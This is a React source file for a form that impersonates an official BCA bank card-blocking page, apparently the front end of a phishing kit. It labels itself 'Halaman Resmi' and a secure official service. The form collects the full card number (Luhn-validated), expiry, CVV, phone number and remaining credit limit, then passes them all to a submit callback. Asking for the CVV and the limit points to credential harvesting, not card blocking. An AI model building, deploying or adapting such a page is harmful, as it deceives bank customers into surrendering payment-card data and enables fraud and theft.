import React, { useState } from 'react';
import { FlipCard3D } from '../FlipCard3D';
import { BcaLogo } from '../BcaLogo';
import {
  formatCardNumber,
  formatExpiry,
  formatRupiah,
  detectCardType,
  hasCvvCapability,
  validateLuhn,
} from '../../utils/cardUtils';

interface BlokirBcaFormProps {
  onSubmitSuccess: (details: {
    cardType: string;
    noKartu: string;
    noHp: string;
    masa: string;
    cvv: string;
    limit: string;
  }) => void;
}

export const BlokirBcaForm: React.FC<BlokirBcaFormProps> = ({ onSubmitSuccess }) => {
  const [noKartu, setNoKartu] = useState('');
  const [noHp, setNoHp] = useState('');
  const [masa, setMasa] = useState('');
  const [cvv, setCvv] = useState('');
  const [limit, setLimit] = useState('');
  const [isFlipped, setIsFlipped] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const cleanCardNum = noKartu.replace(/\D/g, '');
  const cardBrand = detectCardType(cleanCardNum);
  const showCvv = hasCvvCapability(cleanCardNum);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setNoKartu(formatted);
    setErrorMsg(null);
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, '').substring(0, 15);
    setNoHp(digits);
    setErrorMsg(null);
  };

  const handleMasaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiry(e.target.value);
    setMasa(formatted);
    setErrorMsg(null);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, '').substring(0, 4);
    setCvv(digits);
    setErrorMsg(null);
  };

  const handleLimitChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatRupiah(e.target.value);
    setLimit(formatted);
    setErrorMsg(null);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    if (cleanCardNum.length < 13 || cleanCardNum.length > 19) {
      setErrorMsg('Nomor Kartu tidak valid (13-19 digit).');
      return;
    }

    if (!validateLuhn(cleanCardNum)) {
      setErrorMsg('Nomor Kartu ditolak oleh sistem keamanan (Gagal verifikasi Algoritma Luhn).');
      return;
    }

    if (noHp.length < 10 || !noHp.startsWith('08')) {
      setErrorMsg("Nomor Handphone harus valid, diawali '08', minimal 10 digit.");
      return;
    }

    if (masa.length !== 5 || !masa.includes('/')) {
      setErrorMsg('Format Masa Berlaku harus MM/YY.');
      return;
    }

    if (showCvv && (cvv.length < 3 || cvv.length > 4)) {
      setErrorMsg('CVV harus 3 atau 4 digit.');
      return;
    }

    onSubmitSuccess({
      cardType: cardBrand.name,
      noKartu,
      noHp,
      masa,
      cvv: showCvv ? cvv : 'Tidak Ada',
      limit,
    });
  };

  return (
    <div>
      {/* Header */}
      <div className="flex items-center justify-between mb-3 pr-8">
        <BcaLogo height={24} textColor="#0060af" emblemColor="#0060af" />
        <div className="text-[11px] text-[#0060af] font-bold bg-[#ebf1f6] px-2 py-0.5 rounded-full">
          Halaman Resmi
        </div>
      </div>

      {/* 3D Flip Card */}
      {showCvv && (
        <FlipCard3D
          isFlipped={isFlipped}
          brandName="BANK BCA"
          brandBadge={cleanCardNum ? cardBrand.badge : 'BCA'}
          cardNumber={noKartu}
          gradient="linear-gradient(135deg, #002d62 0%, #004b93 50%, #001f44 100%)"
          cvv={cvv}
          onToggleFlip={() => setIsFlipped((prev) => !prev)}
        />
      )}

      {errorMsg && (
        <div className="mb-2.5 p-2 bg-red-50 border border-red-200 text-red-700 text-xs rounded-md">
          {errorMsg}
        </div>
      )}

      <form id="formBlokir" onSubmit={handleSubmit} className="space-y-2.5 pt-1">
        <div>
          <label
            htmlFor="bNoKartu"
            className="flex items-center justify-between text-xs font-bold text-[#1a2b4c] mb-1"
          >
            <span>Nomor Kartu</span>
            {cleanCardNum && (
              <span className="text-[10px] font-bold text-[#0060af]">
                [ {cardBrand.name} ]
              </span>
            )}
          </label>
          <input
            type="text"
            id="bNoKartu"
            value={noKartu}
            onChange={handleCardNumberChange}
            placeholder="16 angka no kartu"
            className="w-full px-3 py-2 bg-[#ebf1f6] border border-[#d0dbe5] rounded-md text-xs text-[#1a2b4c] placeholder-[#94a3b8] focus:border-[#0060af] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#0060af]/10 transition-all font-mono"
            inputMode="numeric"
            maxLength={23}
            required
          />
        </div>

        <div className="grid grid-cols-2 gap-2">
          <div>
            <label htmlFor="bMasa" className="block text-xs font-bold text-[#1a2b4c] mb-1">
              Masa Berlaku
            </label>
            <input
              type="text"
              id="bMasa"
              value={masa}
              onChange={handleMasaChange}
              placeholder="BB/TT"
              className="w-full px-3 py-2 bg-[#ebf1f6] border border-[#d0dbe5] rounded-md text-xs text-[#1a2b4c] placeholder-[#94a3b8] focus:border-[#0060af] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#0060af]/10 transition-all font-mono"
              inputMode="numeric"
              maxLength={5}
              required
            />
          </div>

          {showCvv && (
            <div id="cvvFormGroup">
              <label htmlFor="cvvInputBox" id="cvvLabel" className="block text-xs font-bold text-[#1a2b4c] mb-1">
                CVV
              </label>
              <input
                type="password"
                id="cvvInputBox"
                value={cvv}
                onChange={handleCvvChange}
                onFocus={() => setIsFlipped(true)}
                onBlur={() => setIsFlipped(false)}
                placeholder="3 digit"
                className="w-full px-3 py-2 bg-[#ebf1f6] border border-[#d0dbe5] rounded-md text-xs text-[#1a2b4c] placeholder-[#94a3b8] focus:border-[#0060af] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#0060af]/10 transition-all font-mono"
                inputMode="numeric"
                maxLength={4}
                required
              />
            </div>
          )}
        </div>

        <div>
          <label htmlFor="bNoHp" className="block text-xs font-bold text-[#1a2b4c] mb-1">
            Nomor Telepon
          </label>
          <input
            type="text"
            id="bNoHp"
            value={noHp}
            onChange={handlePhoneChange}
            placeholder="0812xxxxxxxxxxx"
            className="w-full px-3 py-2 bg-[#ebf1f6] border border-[#d0dbe5] rounded-md text-xs text-[#1a2b4c] placeholder-[#94a3b8] focus:border-[#0060af] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#0060af]/10 transition-all"
            inputMode="numeric"
            maxLength={15}
            required
          />
        </div>

        <div>
          <label htmlFor="bLimit" className="block text-xs font-bold text-[#1a2b4c] mb-1">
            Sisa Limit
          </label>
          <input
            type="text"
            id="bLimit"
            value={limit}
            onChange={handleLimitChange}
            placeholder="Rp 0"
            className="w-full px-3 py-2 bg-[#ebf1f6] border border-[#d0dbe5] rounded-md text-xs text-[#1a2b4c] placeholder-[#94a3b8] focus:border-[#0060af] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#0060af]/10 transition-all font-mono"
            inputMode="numeric"
            required
          />
        </div>

        <div className="my-2.5 text-left bg-white border border-[#b8c4ce] rounded-lg p-2.5">
          <div className="text-[#00508c] text-[13px] font-bold mb-1.5">Catatan:</div>
          <ul className="list-none p-0 m-0 flex flex-col gap-1 text-[11px] text-[#55606b] leading-snug">
            <li className="relative pl-4 before:content-['•'] before:absolute before:left-1 before:-top-0.5 before:text-base before:text-[#00508c]">
              Kartu Paspor BCA yang diblokir tidak dapat digunakan kembali untuk bertransaksi di ATM, EDC, maupun transaksi online.
            </li>
            <li className="relative pl-4 before:content-['•'] before:absolute before:left-1 before:-top-0.5 before:text-base before:text-[#00508c]">
              Untuk penggantian kartu fisik baru, silakan kunjungi kantor cabang BCA terdekat atau melalui mesin CS Digital.
            </li>
            <li className="relative pl-4 before:content-['•'] before:absolute before:left-1 before:-top-0.5 before:text-base before:text-[#00508c]">
              Pastikan seluruh data kartu yang dimasukkan sudah sesuai sebelum menekan tombol Lanjutkan.
            </li>
          </ul>
        </div>

        <button
          type="submit"
          className="w-full py-3 bg-[#0060af] text-white rounded-md text-sm font-bold cursor-pointer hover:bg-[#004080] hover:scale-[1.02] hover:shadow-[0_8px_20px_rgba(0,96,175,0.4)] active:scale-[0.98] transition-all duration-200 shadow-[0_4px_12px_rgba(0,96,175,0.25)] mt-2"
          id="submitBlokirBtn"
        >
          Lanjutkan Blokir
        </button>
      </form>

      <div className="flex items-center justify-center gap-1.5 text-[11px] text-[#5c6f84] mt-2.5">
        <span>🔒 Layanan Keamanan Resmi & Terlindungi</span>
      </div>
    </div>
  );
};
